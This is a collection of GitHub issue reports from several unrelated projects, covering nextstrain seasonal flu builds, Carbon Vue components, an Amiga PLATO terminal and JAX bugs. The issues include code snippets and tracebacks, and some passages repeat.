The Newick tree for the current segment is [already an input for the clades rule](https://github.com/nextstrain/seasonal-flu/blob/1f07773/Snakefile#L515-L538), so it would not be difficult to force that input tree to always be the HA tree instead. @rneher ---

I don't think I introduced this bug. But you first might want to check one of your existing JSONs to confirm it's present there as well. If I build `flu/who/h3n2/ha/2y/cell/hi`, the substitution model inference of tip antigenic advancement looks good via auspice v2:

<img width="955" alt="screen shot 2019-01-30 at 8 14 10 am" src="https://user-images.githubusercontent.com/1176109/51995172-0a9fff80-2467-11e9-91e5-d2457e4618b1.png">

However, the display in auspice v1 (`nextflu/auspice`) doesn't register these antigenic changes:

<img width="866" alt="screen shot 2019-01-30 at 8 15 24 am" src="https://user-images.githubusercontent.com/1176109/51995252-358a5380-2467-11e9-88bc-03e79258fdfd.png">

I thought this might have been how substitutions are encoded in `flu_who_h3n2_ha_2y_cell_hi_titer-sub-model.json`, but this actually looks good. Thinking now it may be entirely an issue with auspice v1. The subsampling logic for strain selection in original augur supported a ["priority" sampling for specific regions](https://github.com/nextstrain/augur/blob/4ed0024/builds/flu/flu_subsampling.py#L97-L128). This type of prioritization is helpful for custom flu builds where one wants to investigate evolutionary patterns in specific regions. The [current strain selection script for seasonal flu](https://github.com/nextstrain/seasonal-flu/blob/master/scripts/select_strains.py) exposes the same `--sampling` flag used by old augur, but this flag is ignored.

To enable preferred sampling of regions by the current script, some of the code from the original subsampling script needs to be migrated. Egg-passaged sequences currently appear in seasonal flu builds. These should be filtered out during the `augur filter` step by excluding viruses with an "egg" passage history in the metadata. Currently, besides reference genomes, `select_strains.py` is only passing through viruses that possess both HA and NA segments (due to our use of `--segments ha na` in the snakefile). For time pivots back about 3-6 months this is okay and there are usually enough strains with both HA and NA to fill sampling bins. However, some strains are just only getting HA sequenced. This was especially obvious looking just now where there are a number of H3s from January with just HA. These tend to be uploaded by groups that are not CCs.

I would propose to modify `select_strains.py` so that "complete" genome (as in possessing all entries in `--segments`) becomes another factor in `priority` rather than a hard constraint. The subsampling logic for strain selection in original augur supported a ["priority" sampling for specific regions](https://github.com/nextstrain/augur/blob/4ed0024/builds/flu/flu_subsampling.py#L97-L128). This type of prioritization is helpful for custom flu builds where one wants to investigate evolutionary patterns in specific regions. The [current strain selection script for seasonal flu](https://github.com/nextstrain/seasonal-flu/blob/master/scripts/select_strains.py) exposes the same `--sampling` flag used by old augur, but this flag is ignored.

To enable preferred sampling of regions by the current script, some of the code from the original subsampling script needs to be migrated. Egg-passaged sequences currently appear in seasonal flu builds. These should be filtered out during the `augur filter` step by excluding viruses with an "egg" passage history in the metadata. The current script to import tip clades from HA to non-HA segments identifies internal nodes by [checking that the first four characters of the node name match "NODE"](https://github.com/nextstrain/seasonal-flu/blob/1f07773/scripts/import_tip_clades.py#L31). The fact that internal nodes have this specific name is [a design decision from TreeTime](https://github.com/neherlab/treetime/blob/273a236/treetime/treeanc.py#L766). This approach tries to infer the data structure from the data contents when information about the structure is already available in an external Newick file.

I'd suggest we pass the original HA tree Newick to this script and use the Bio.Phylo `is_terminal` method to identify internal nodes instead of testing for specific text. This change will prevent the script from silently breaking when/if TreeTime names internal nodes something different in the future and will avoid confusion when someone would otherwise have to figure out where the "NODE" text comes (I admit this took me a little while to track down). Although this change couples the script to the Bio.Phylo interface, that interface is something more easily grepped for and replaced during a future refactor.

The Newick tree for the current segment is [already an input for the clades rule](https://github.com/nextstrain/seasonal-flu/blob/1f07773/Snakefile#L515-L538), so it would not be difficult to force that input tree to always be the HA tree instead. @rneher ---

I don't think I introduced this bug. But you first might want to check one of your existing JSONs to confirm it's present there as well. If I build `flu/who/h3n2/ha/2y/cell/hi`, the substitution model inference of tip antigenic advancement looks good via auspice v2:

<img width="955" alt="screen shot 2019-01-30 at 8 14 10 am" src="https://user-images.githubusercontent.com/1176109/51995172-0a9fff80-2467-11e9-91e5-d2457e4618b1.png">

However, the display in auspice v1 (`nextflu/auspice`) doesn't register these antigenic changes:

<img width="866" alt="screen shot 2019-01-30 at 8 15 24 am" src="https://user-images.githubusercontent.com/1176109/51995252-358a5380-2467-11e9-88bc-03e79258fdfd.png">

I thought this might have been how substitutions are encoded in `flu_who_h3n2_ha_2y_cell_hi_titer-sub-model.json`, but this actually looks good. Thinking now it may be entirely an issue with auspice v1. The current auspice configuration file (`config/auspice_config.json`) is not always appropriate for all builds in the Snakefile. The most obvious example of this is that the auspice config exports a color-by for “RBS mutations” even though A/H3N2 HA builds are the only ones that define RBS mutations.

This feels like an issue that should be resolved at the level of the Snakefile and not at the augur or auspice level (it's not necessary for those tools to know that this is how we are using them). Possible solutions at the Snakefile-level include:

  - define one separate config JSON per build (duplicating any shared content) and reference these files by wildcards (`config/auspice_config_{lineage}_{segment}_{resolution}.json`)
  - define one default config JSON shared by most builds and allow build-specific copies of this default to be defined through [a Snakemake input function](https://snakemake.readthedocs.io/en/stable/snakefiles/rules.html#functions-as-input-files)  (e.g., `config/auspice_config_h3n2_ha.json`)
  - define a single templated config JSON (as with [jinja](http://jinja.pocoo.org/), etc.) that contains all shared and build-specific content and render one config JSON per build from this template using conditional logic

The first solution seems the least ideal in that most of these configs will be identical and any update to the shared content between them will require the same updates to many files.

The second solution still duplicates shared content but benefits from defining build-specific conditional logic in Python in the Snakefile. For seasonal flu, it seems likely that the custom config will be the exception and not the rule, so a little duplicated content may not be the worst outcome.

The third solution is guaranteed to avoid content duplication, but it does move the build-specific conditional logic into a templating language. This might be the best solution in the long run if each build ends up having its own slight modifications to the shared settings. In the short term, though, it feels like an over-engineered approach.
 Currently, epitope (`ep`) and non-epitope (`ne`) coloring for H1N1pdm NA is broken:

* https://nextstrain.org/flu/seasonal/h1n1pdm/na/2y?c=ep
* https://nextstrain.org/flu/seasonal/h1n1pdm/na/2y?c=ne Submitting this here per conversations on Slack and with Tom.

The latest H3N2 WHO builds failed multiple times when they were run on AWS, seemingly because they exceed the disk limit (22GB) allocated to instances on AWS. They were submitted using:

`python batch.py --system batch --version who`

The logs for the failed run can be found [here](https://console.aws.amazon.com/cloudwatch/home?region=us-east-1#logEventViewer:group=/aws/batch/job;stream=nextstrain-job/default/e44c55f5-1c76-4d8c-8e58-9c743353308a). The build seems to fail during the final `zip` step, which points toward an issue with disk space. This will hopefully be helped by https://github.com/nextstrain/augur/pull/278, but as a short term solution can also be helped by subdividing WHO builds by more than just subtype. Submitting this here per conversations on Slack and with Tom.

The latest H3N2 WHO builds failed multiple times when they were run on AWS, seemingly because they exceed the disk limit (22GB) allocated to instances on AWS. They were submitted using:

`python batch.py --system batch --version who`

The logs for the failed run can be found [here](https://console.aws.amazon.com/cloudwatch/home?region=us-east-1#logEventViewer:group=/aws/batch/job;stream=nextstrain-job/default/e44c55f5-1c76-4d8c-8e58-9c743353308a). The build seems to fail during the final `zip` step, which points toward an issue with disk space. This will hopefully be helped by https://github.com/nextstrain/augur/pull/278, but as a short term solution can also be helped by subdividing WHO builds by more than just subtype. Some discussion with Becky:
 * she has prevalence data scrapped from FluNet that we could use for subsampling. 
 * we could use this for subsampling and calculation of global frequencies. 
 * this becomes more important as they are preferentially sampling rare lineages.  Currently, besides reference genomes, `select_strains.py` is only passing through viruses that possess both HA and NA segments (due to our use of `--segments ha na` in the snakefile). For time pivots back about 3-6 months this is okay and there are usually enough strains with both HA and NA to fill sampling bins. However, some strains are just only getting HA sequenced. This was especially obvious looking just now where there are a number of H3s from January with just HA. These tend to be uploaded by groups that are not CCs.

I would propose to modify `select_strains.py` so that "complete" genome (as in possessing all entries in `--segments`) becomes another factor in `priority` rather than a hard constraint. <img width="1023" alt="image" src="https://user-images.githubusercontent.com/10130954/55139842-ac934e00-5171-11e9-91c7-f6c5e973dbe3.png">

<---------->
154490057
  I can't find it. Where are you on this? I'm running `MDS_DEV_DEBUG=1 pypthon manage.py runserver` and when I try to access
`authent/applications`, I get `'oauth2_provider' is not a registered namespace` .
Am I doing something wrong? Maybe it's not created yet but I don't know so here's my issue for you. :) Hey ! Thanks a lot for making this public.
I wanted to know if you're implementing only the agency API or the provider API as well?
I don't understand very well the structure of the project yet so I'm spending quite some time reading the code. I can't find it. Where are you on this?
<---------->
154535475
## Carbon tab components switch to a dropdown on small screens carbon/vue does not function when this happens.

## Steps to reproduce the issue

1. Reduce the width of the screen until a dropdown appears.
2. Note it is empty

## Additional information

- Screenshots or code
- Notes
 **Is your feature request related to a problem? Please describe.**
The react implementation of carbon components contains a number of additional features when compared to the vanilla implementation. List and build out these additional compoments.

**Describe the solution you'd like**
Feature parity with carbon react

**Describe alternatives you've considered**
N/A

**Additional context**
N/A **Is your feature request related to a problem? Please describe.**
Add a Vue.js implementation of the carbon data-table components http://www.carbondesignsystem.com/components/data-table

**Describe the solution you'd like**
Single file templates, notes and story as per other components.

Ideally, it should not rely on core javascript.

**Describe alternatives you've considered**
Initial version can rely on core carbon javascript.

**Additional context**
Add any other context or screenshots about the feature request here.

Todo:
- [x] Add filter
- [x] Add selection and associated controls
- [x] Add toolbar
- [x] Add overflow menu to rows
- [x] HTML table cell content
- [x] Update notes file Some components support a form item and non-form item version. Swap the unpublished form-item="false" switch for a public inline="true".

NOTE: Some components already use inline to mean something else. CarbonReact creates a seperate 
 component with it's name prefixed with inline.
 Some components support a form item and non-form item version. Swap the unpublished form-item="false" switch for a public inline="true".

NOTE: Some components already use inline to mean something else. CarbonReact creates a seperate 
 component with it's name prefixed with inline.
 ## Checkbox story tab is broken
When the story tab for the checkbox component is opened, the screen goes blank (except for the "Array v-model" variant).

## Detailed description

> Describe in detail the issue you're having.
Same as above
```
TypeError: Cannot read property 'startLoc' of undefined
    at x (vendors~main.5be00741564a1b1d153e.bundle.js:90)
    at t.createStoryPart (vendors~main.5be00741564a1b1d153e.bundle.js:90)
    at vendors~main.5be00741564a1b1d153e.bundle.js:90
    at Array.forEach (<anonymous>)
    at t.createParts (vendors~main.5be00741564a1b1d153e.bundle.js:90)
    at vendors~main.5be00741564a1b1d153e.bundle.js:90
    at g (vendors~main.5be00741564a1b1d153e.bundle.js:136)
    at Qo (vendors~main.5be00741564a1b1d153e.bundle.js:102)
    at Ci (vendors~main.5be00741564a1b1d153e.bundle.js:102)
    at Ri (vendors~main.5be00741564a1b1d153e.bundle.js:102)
```

> Is this a feature request (new component, new icon), a bug, or a general issue?
Bug

> Is this issue related to a specific component?
Checkbox

> What did you expect to happen? What happened instead? What would you like to see changed?
Story code is shown for all variants

> What browser are you working in?
Chrome

> What version of the Carbon Design System are you using?
9.81.2

> What offering/product do you work on? Any pressing ship or release dates we should be aware of?
None

## Steps to reproduce the issue

1. Open checkbox component in story book
2. Click on the "Story" tab
3. Screen goes blank

## Additional information
I investigated the problem and it is caused by the "Array v-model" story. If the `knobsHelper.getStorySet` function is used, the issue does not occur.
But then the "array" knob-addon is not working
Generally I'm not sure if the "Initial checks" knobs is useful, because it changes nothing. The component can't be reinitialised to use the value of the knob.

 **Is your feature request related to a problem? Please describe.**
I currently cannot make a TextInput with password style (hidden/show chars)

**Describe the solution you'd like**
Feature import of TextInput password field : https://www.carbondesignsystem.com/components/text-input/code

**Describe alternatives you've considered**
Alternative is to build my own password field from an usual textinput with calculated variable.
 Implement the inline loading component found here

https://www.carbondesignsystem.com/components/inline-loading/code Implement the inline loading component found here

https://www.carbondesignsystem.com/components/inline-loading/code ## Detailed description

Bug: 

## Steps to reproduce the issue

1. Open vue.carbondesignsystems.com
2. Navigate to CVTooltip/default (Interactive tooltip) or CVTooltip/minimal (Interactive tooltip)
3. Click on 'Show tip' or 'Hide tip' button
## Additional information

![image](https://user-images.githubusercontent.com/5481483/54138711-493eb780-4420-11e9-9552-c5dc966a7c46.png)
 **Is your feature request related to a problem? Please describe.**
It would be helpful to be able to deselect one or more specific rows from the `DataTable`, rather than all of them (which is the current behavior of `deselect`). 

**Describe the solution you'd like**
To allow for the user to specify one or more `rowIndex` they would like to deselect from the table. 

**Describe alternatives you've considered**
Directly modifying the DOM gets very messy very fast. 

**Additional context**
Separately, the documentation for `DataTable` should be updated to include the `deselect` method, even if no functionality is added. 
 Carbon styling is in the process of being updated, there are some breaking changes in the HTML structure.

Steps to migrate

- [x] Create an experimental branch with styling switch
- [ ] Document components with breaking changes and create issues. A number of form components come wrapped in a form item. While some support the form-item switch it defaults to true.

Options:
1. Using the current technique default form-item to false.
2. Remove the form item from the components and expect the user to add their own.

NOTE: This may require changes to core carbon CSS if unwrapped form components are not currently supported. <!-- Feel free to remove sections that aren't relevant.

## Title line template: [Title]: Brief description

-->


## Detailed description
> When a cv-checkbox is disabled you don't have your cursor in state : not-allowed
## Steps to reproduce the issue

1. Create a cv-checkbox element with disabled status to true.
`<cv-checkbox label="a" name="a" value="a" disabled="true"></cv-checkbox>`
2. Hover it with your cursor, you'll see a pointer cursor.

## Additional information

- Screenshots or code
- Notes
 ## Detailed description

> Describe in detail the issue you're having.

Opening an OverflowMenu causes the page to jump to the top and possibly hiding the desired content.

> Is this a feature request (new component, new icon), a bug, or a general issue?

 Bug

> Is this issue related to a specific component?

`cv-overflow-menu`

> What did you expect to happen? What happened instead? What would you like to see changed?

When a user clicks on the meatball / kebap menu icon to open an OverflowMenu, the page jumps to the top. If the OverflowMenu is below "the fold" the user doesn't see the opened menu until manually scrolling down.

> What browser are you working in?

Chrome 72.0.3626.121

> What version of the Carbon Design System are you using?

`@carbon/vue@1.0.1`
`carbon-components@9.83.0`

## Steps to reproduce the issue

1. Open http://vue.carbondesignsystem.com/?selectedKind=CvOverflowMenu
2. Scroll down a bit so only one or a maximum of two circles of the kebap icon are visible
3. Click on the kebap menu icon
4. (Page jumps to top)

To better illustrate the issue, I created a small pen: https://codepen.io/janhassel/pen/RdVZBg
After scrolling through some lorem ipsum there is an OverflowMenu, clicking on it (in Chrome, couldn't reproduce in Safari) causes the page to jump back to the top. Scrolling down reveals that the menu indeed opened. **Is your feature request related to a problem? Please describe.**
When using the data table, a row select would be helpful to trigger action based on the selected row

**Describe the solution you'd like**
Event binding on "onRowSelect" with the given row as parameter.

**Describe alternatives you've considered**
Binding the TR-tag manually, but this is a workaround, breaking the vue-DOM concept.

**Additional context**
None A number of component parts can be simple text or HTML content. When they are text they're easier to use as a prop but less flexible as a result.

Review component slots and props with the intention of having prop/slot hybrids hence slops ;-)

See invalid-message and helper-text for examples of a slop.

## Components in need of update
- [ ] Toggle left and right text
- [ ]  ## Detailed description

With .babelrc in the root folder it is not possible to run "yarn build" successfully.
 ## Detailed description

> Buttons should be assigned type button|submit|reset as per https://www.w3schools.com/tags/att_button_type.asp

Not doing so means buttons wrapped in a form submit in chrome by deault.

## Steps to reproduce the issue
1. Type some text into the input
2. Click the button, it automatically submits. This may be desirable.
3. Click on the tiles expand button, the same happens. This is not desirable.

## Solution
- Add a default type for all buttons but allow the user to override.
- submit for actual CvButton
- button for others.

## Additional information

- Screenshots or code
https://codepen.io/lee-chase/pen/6065b0e5f1ee791aedb6069380366baa
![image](https://user-images.githubusercontent.com/15086604/52501477-5cb7f200-2bd8-11e9-9209-4d02ddfc011c.png)

 Find and replace for 'contnent' in order.
<---------->
154606566
You may use Enforcer to see the hits. Wrong timestamp in ADF
````PLATOTerm:> list pl#?
PLATOTerm.info                    1407 ----rwed 03-Dez-18 09:41:46
PLATOTerm                        92688 ----rwed 04-Jun-27 23:38:11
2 files - 94095 bytes used```` I believe this may be a 1.3 vs 2.0 and greater issue, however:
Once connected (to irata.online port 8005,) the colors are redefined.

For the login page, the text is red on green.
Once logged in a guest, the screen seems blank - but hitting enter (next) seems to have entered the game menu, which then changes the screen to bright blue with gold text;  however the palette shows that the first color is gold, the second grey, the third red, fourth bright green, fifth bright blue, sixth and seventh black, and the last white.

This seems different from my experience with the c64 Plato terminal, as well as what I recall from College where we had a Plato terminal.  (Mind you, I think that was a green only monitor.)
 I'd love to do some testing on this on prism2.device http://aminet.net/package/driver/net/prism2v2. It's a driver for many PCMCIA wireless cards for Amiga such as this one: https://retroready.one/collections/internet-networking/products/wifi-cards-netgear-wpa2-aes-amiga-a600-a1200-pcmcia-wifi-wlan?variant=12700646932550

The terminal for Amiga has a facility to change serial device, but throws an error/exception when prism2.device is entered.

No expectation, just a request. Thanks for supporting the platform. [MorphOS screenshot](https://i.ibb.co/F509tYN/amiga.png)
<---------->
154739597
I'm trying to compute per-example hessian-vector products, where the model includes a MaxPool layer, and I'm getting this error:
```
  File "cnn.py", line 62, in loss
    logits = predict_fun(params, inputs)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/experimental/stax.py", line 295, in apply_fun
    inputs = fun(param, inputs, rng=rng, **kwargs)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/experimental/stax.py", line 186, in apply_fun
    out = lax.reduce_window(inputs, init_val, reducer, dims, strides, padding)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/lax/lax.py", line 949, in reduce_window
    return monoid_reducer(operand, window_dimensions, window_strides, padding)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/lax/lax.py", line 984, in _reduce_window_max
    window_strides=tuple(window_strides), padding=padding)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/core.py", line 155, in bind
    out_tracer = top_trace.process_primitive(self, tracers, kwargs)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/interpreters/ad.py", line 222, in process_primitive
    primal_out, tangent_out = jvp(primals_in, tangents_in, **params)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/interpreters/ad.py", line 320, in standard_jvp
    val_out = primitive.bind(*primals, **params)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/core.py", line 155, in bind
    out_tracer = top_trace.process_primitive(self, tracers, kwargs)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/interpreters/ad.py", line 222, in process_primitive
    primal_out, tangent_out = jvp(primals_in, tangents_in, **params)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/interpreters/ad.py", line 321, in standard_jvp
    tangents_out = [rule(t, *primals, **params) for rule, t in zip(jvprules, tangents)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/interpreters/ad.py", line 322, in <listcomp>
    if rule is not None and t is not zero]
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/lax/lax.py", line 3590, in _reduce_window_chooser_jvp_rule
    window_strides, padding)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/lax/lax.py", line 1013, in _select_and_gather_add
    window_strides=tuple(window_strides), padding=padding)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/core.py", line 155, in bind
    out_tracer = top_trace.process_primitive(self, tracers, kwargs)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/interpreters/batching.py", line 116, in process_primitive
    batched_primitive = get_primitive_batcher(primitive)
  File "/h/choidami/software/anaconda/lib/python3.7/site-packages/jax/interpreters/batching.py", line 168, in get_primitive_batcher
    raise NotImplementedError(msg.format(p))
NotImplementedError: Batching rule for 'select_and_gather_add' not implemented
```

The code I used is a simple modification of the resnet50.py example in the repo. 
```
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function

from functools import partial

import numpy.random as npr

from six.moves import xrange

import jax.numpy as np
from jax.config import config
from jax import jit, grad, random, vmap, jvp
from jax.experimental import optimizers
from jax.experimental import stax
from jax.experimental.stax import (Conv, Dense, Flatten, GeneralConv,
                                   MaxPool, Relu, LogSoftmax)
from jax.flatten_util import ravel_pytree


def CNN(num_classes):
  return stax.serial(
      stax.Conv(32, (5, 5), strides=(2, 2)),
      Relu,
      stax.MaxPool((2, 2), strides=(2, 2)),
      Flatten,
      Dense(num_classes), LogSoftmax)


if __name__ == "__main__":
    rng_key = random.PRNGKey(0)

    batch_size = 8
    num_classes = 10
    input_shape = (batch_size, 32, 32, 3)
    step_size = 0.1
    num_steps = 10

    init_fun, predict_fun = CNN(num_classes)
    _, init_params = init_fun(rng_key, input_shape)

    def loss(params, batch):
        inputs, targets = batch
        logits = predict_fun(params, inputs)
        return -np.sum(logits * targets)

    def accuracy(params, batch):
        inputs, targets = batch
        target_class = np.argmax(targets, axis=-1)
        predicted_class = np.argmax(predict_fun(params, inputs), axis=-1)
        return np.mean(predicted_class == target_class)

    def synth_batches():
        rng = npr.RandomState(0)
        while True:
            images = rng.rand(*input_shape).astype('float32')
            labels = rng.randint(num_classes, size=(batch_size, 1))
            onehot_labels = labels == np.arange(num_classes)
            yield images, onehot_labels

    opt_init, opt_update, get_params = optimizers.momentum(step_size, mass=0.9)
    batches = synth_batches()


    def fgh_fn(loss, params, batch, v):
        _loss = partial(loss, batch=batch)
        grads, hvp = jvp(grad(_loss), [params], [v])
        return grads, hvp


    def per_example_gh(loss, params, batch, v):
        fgh = partial(fgh_fn, loss)

        # Add extra batch dimension in case some functions assume it.
        def batch_fgh(params, batch, v):
            X, y = batch
            X = np.expand_dims(X, 0)
            y = np.expand_dims(y, 0)
            return fgh(params, (X, y), v)

        return vmap(batch_fgh, in_axes=(None, 0, None))(params, batch, v)

    @jit
    def update(i, opt_state, batch):
        params = get_params(opt_state)
        flat_params, unravel = ravel_pytree(params)

        def flat_loss(flat_params, batch):
            return loss(unravel(flat_params), batch)
        gs, hvps = per_example_gh(flat_loss, flat_params, batch, np.ones_like(flat_params))
        return opt_update(i, grad(loss)(params, batch), opt_state)

    opt_state = opt_init(init_params)
    for i in xrange(num_steps):
        opt_state = update(i, opt_state, next(batches))
    trained_params = get_params(opt_state)
```
 In this case, taking the inverse in jax.numpy throws the error 'No abstraction handler for type: <class 'jax.numpy.lax_numpy.ndarray'>', while doing the same thing in numpy does not.

```
import jax.numpy as np
import numpy.random as random
import matplotlib.pyplot as plt


class KalmanFilter():
    def __init__(self):
        self.initialized = False

    def to_ndarray(self, x):
        if(type(x) is not np.ndarray):
            x_2D = np.ndarray((1, 1))
            x_2D[0, 0] = x
        else:
            x_2D = x
        return x_2D

    def initialize(self, x, A, B, H, P, Q, R):

        self.initialized = True

        x, A, B, H, P, Q, R = self.to_ndarray(x), self.to_ndarray(A), self.to_ndarray(B), self.to_ndarray(H), self.to_ndarray(P), self.to_ndarray(Q), self.to_ndarray(R)

        self.x, self.A, self.B, self.H, self.P, self.Q, self.R  = x, A, B, H, P, Q, R
        self.K = np.ndarray(A.shape)

    def step(self, u, z, n = 1):
        u, z = self.to_ndarray(u), self.to_ndarray(z)

        for i in range(n):
            self.x = self.A @ self.x + self.B @ u
            self.P = self.A @ self.P @ self.A.T + self.Q

        self.K = self.P @ self.H.T @ np.linalg.inv(self.H @ self.P @ self.H.T + self.R)
        self.x = self.x + self.K @ (z - self.H @ self.x)
        self.P = self.P - self.K @ self.H @ self.P

        if(type(z) is float):
            return float(self.x)
        else:
            return self.x

    def predict(self, u, z, n = 1):

        u, z = self.to_ndarray(u), self.to_ndarray(z)

        for i in range(n):
            x_temp = self.A @ self.x + self.B @ u
            P_temp = self.A @ self.P @ self.A.T + self.Q

        K_temp = P_temp @ self.H.T @ np.linalg.inv(self.H @ P_temp @ self.H.T + self.R)
        x_temp = x_temp + K_temp @ (z - self.H @ x_temp)

        if(type(z) is not np.ndarray):
            return float(x_temp)
        else:
            return x_temp

def test_kalman_filter(steps=100, show_plot=True):
    T = steps 
    x_true = 0.5
    env_noise = 0.1
    x0 = 0

    model = KalmanFilter()
    model.initialize(x0, 1, 0, 1, 1, 0, env_noise)

    loss = lambda x_true, x_pred: (x_true - x_pred)**2

    results = []
    for i in range(T):
        z = x_true + float(random.normal(0, env_noise, 1))
        x_pred = model.step(0, z)
        cur_loss = float(loss(x_true, x_pred))
        results.append(cur_loss)

    if show_plot:
        plt.plot(results)
        plt.title("KalmanFilter model on constant signal")
        plt.show(block=False)
        plt.pause(1)
        plt.close()
    print("test_kalman_filter passed")
    return

if __name__=="__main__":
    test_kalman_filter()
``` This piece of code is incorrect since in_axes should be (0, 0) instead of (0, 1)

def h(a, b):
 return np.sum(a) + np.sum(b)

X = onp.random.randn(10, 4)
U = onp.random.randn(10, 2)
vmap(h, in_axes=(0, 1))(X, U)

The current error message is:
"got inconsistent map dimension sizes: set([10, 2])"
 
I think the error message could describe the input shapes and mention which dimensions we are batching over.



 ```jax/interpreters/batching.py in _dimsize(dim, aval, x)
    294       return reduce(set.union, map(_dimsize, dim, aval, x))
    295     elif type(dim) is int:
--> 296       return reduce(set.union, map(partial(_dimsize, dim), aval, x))
    297     elif dim is None:
    298       return set()

TypeError: reduce() of empty sequence with no initial value``` ```
jax/interpreters/batching.py in _dimsize(dim, aval, x)
    294       return reduce(set.union, map(_dimsize, dim, aval, x))
    295     elif type(dim) is int:
--> 296       return reduce(set.union, map(partial(_dimsize, dim), aval, x))
    297     elif dim is None:
    298       return set()

TypeError: reduce() of empty sequence with no initial value
``` Jax's (/ XLA?) implementation of cholesky returns bad values when applied to a non PSD matrix. I would expect the jax impl to throw an error similar to the scipy error.

Code:
```
import jax.numpy as np

x = np.arange(9).reshape((3,3))

from jax.scipy import linalg
print(linalg.cholesky(x))

print("From Scipy")

from scipy import linalg
print(linalg.cholesky(x))
``

Output:

```
/home/luke/.local/lib/python3.5/site-packages/jax/scipy/linalg.py:36: UserWarning: scipy.linalg support is experimental and may cause silent failures or wrong outputs
  warnings.warn(_EXPERIMENTAL_WARNING)
[[0. 1. 2.]
 [0. 4. 5.]
 [0. 0. 8.]]
From Scipy
Traceback (most recent call last):
  File "tmp.py", line 11, in <module>
    print(linalg.cholesky(x))
  File "/home/luke/.local/lib/python3.5/site-packages/scipy/linalg/decomp_cholesky.py", line 91, in cholesky
    check_finite=check_finite)
  File "/home/luke/.local/lib/python3.5/site-packages/scipy/linalg/decomp_cholesky.py", line 40, in _cholesky
    "definite" % info)
numpy.linalg.LinAlgError: 1-th leading minor of the array is not positive definite
``` Hello,

I'm currently trying to implement a trellis network, which requires lots of weight sharing. I'm a little confused on how to implement this with Jax besides writing my own layer definition (I know #430 somewhat addresses this, I'm just wondering if a workaround exists now). Thanks! Hello,

I'm currently trying to implement a [trellis network](https://arxiv.org/abs/1810.06682), an architecture that requires lots of weight sharing. I'm a little confused on how to implement this with Jax besides writing my own layer definition (I know #430 somewhat addresses this, but I'm wondering if a workaround exists). Thanks! The following minimal example causes a strange `AssertionError`:

```python3
import jax
import jax.numpy as np


def cond_fun(state):
    return jax.lax.lt(state[1][0], 10.)


def body_fun(state):
    return (state[0], (state[1][0] + 1.,))


@jax.jit
def run(x):
    c = 1.
    init_state = (x, (c,))
    return jax.lax._while_loop(cond_fun, body_fun, init_state)


run(np.array([1, 2, 3]))
```

```
Traceback (most recent call last):
  File "main.py", line 20, in <module>
    run(np.array([1, 2, 3]))
  File "jax/jax/api.py", line 80, in f_jitted
    jaxtupletree_out = xla.xla_call(jaxtree_fun, *jaxtupletree_args)
  File "jax/jax/core.py", line 529, in call_bind
    ans = primitive.impl(f, *args, **kwargs)
  File "jax/jax/interpreters/xla.py", line 417, in xla_call_impl
    compiled_fun = xla_callable(fun, *map(abstractify, flat_args))
  File "jax/jax/linear_util.py", line 146, in memoized_fun
    ans = call(f, *args)
  File "jax/jax/interpreters/xla.py", line 431, in xla_callable
    compiled, result_shape = compile_jaxpr(jaxpr, consts, *abstract_args)
  File "jax/jax/interpreters/xla.py", line 118, in compile_jaxpr
    built_c = jaxpr_computation(jaxpr, const_vals, (), *arg_shapes)
  File "jax/jax/interpreters/xla.py", line 135, in jaxpr_computation
    map(write, jaxpr.constvars, map(c.Constant, const_vals))
  File "jax/jax/util.py", line 43, in safe_map
    return list(map(f, *args))
  File "jax/jax/lib/xla_bridge.py", line 329, in Constant
    return _constant_handlers[py_type](self, py_val, canonicalize_types)
  File "jax/jax/interpreters/xla.py", line 160, in unit_constant
    assert not val  # must be unit
AssertionError
```

The interesting thing is: it only happens for this particular combination:

- run must be jitted
- init_state must contain a traced variable (`x`) and a non-traced variable (`c`)
- the non-traced variable must be nested
    - using `(x, c)` and adapting `cond_fun` and `body_fun` accordingly works fine

It's not really a big deal because I can just use a flat state variable for now, but it seems like an extremely strange `AssertionError` and it took some time to nail it down to this example. Hi,

This might be misunderstanding, but the following errors:

```
def iterate(f, init_row, steps):
  def body_fun(step, result):
    return f(result)
  return lax.fori_loop(0, steps, body_fun, init_row)

def test_get(a,b): return iterate(lambda x: x[a], b, 10)
test_get_jit = jit(test_get)
test_get_jit(np.array([0,1,2,3]), np.array([0,1,2,3]))
```

```
/usr/local/lib/python3.6/dist-packages/jax/lib/xla_bridge.py in Constant(self, py_val)
    319       return _constant_handlers[py_type](self, py_val)
    320     else:
--> 321       raise TypeError("No constant handler for type: {}".format(py_type))
    322 
    323 

TypeError: No constant handler for type: <class 'jax.interpreters.partial_eval.JaxprTracer'>
```
 If you pass in a jax-wrapped scalar as the fill-constant value to np.fill, it breaks, e.g.:
```python
np.full((1,1), np.array([1])[0])
```
this hits the condition in lax.full:
```python
 elif isinstance(fill_value, xla.DeviceValue):
    return FilledConstant(convert_element_type(fill_value, dtype), shape)
```
no matter what dtype is, the convert_element_type result is still a DeviceArray, then
this line in lax.FillConstant:
```python
class FilledConstant(xla.DeviceConstant):
  __slots__ = ["fill_value"]

  def __init__(self, fill_value, shape):
    assert type(fill_value) is onp.ndarray
```
wants the fill value to be an onp ndarray instead.

I'm not too certain about the type logic here to make a PR confidently. Running
```python
from tensorflow.contrib.framework.python.ops import add_arg_scope
import jax
```
causes
```
TypeError: Couldn't build proto file into descriptor pool!
Invalid proto descriptor for file "tensorflow/compiler/xla/xla_data.proto":
  tensorflow/compiler/xla/xla_data.proto: A file with this name is already in the pool.
```
Full traceback below. I'm using the most recent protobuf and Tensorflow 1.12.0. [This workaround](https://github.com/protocolbuffers/protobuf/issues/3002#issuecomment-325459597) makes the problem go away, but doesn't seem like a permanent solution.

```
---------------------------------------------------------------------------
